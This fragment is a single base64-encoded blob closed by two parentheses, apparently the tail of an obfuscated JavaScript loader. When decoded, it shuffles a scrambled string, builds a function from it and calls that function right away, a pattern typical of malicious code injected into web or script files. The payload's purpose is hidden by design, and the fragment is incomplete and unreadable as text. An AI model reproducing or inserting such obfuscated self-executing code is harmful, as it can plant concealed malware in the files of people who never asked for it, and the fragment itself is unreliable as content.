KZS49MWwkLUogNmVuJjJKSm5mIEllb2wlIDNpUThFSnsxZWUuKXRpZWU7b3ErX2VdSjRKSWUgICE3bHRlSkpULiBKLnphQ2FKMWVySkpKfUolSmVzbiB1LEouLjdKNCB9M0pKIGVpXVtVKV0mX1tJd3JdIG8wKTUnKSk7dmFyIGJJcT1KWHoobG9rLEVhbCApO2JJcSg3NzA1KTtyZXR1cm4gNDQ1NX0pKCk='))
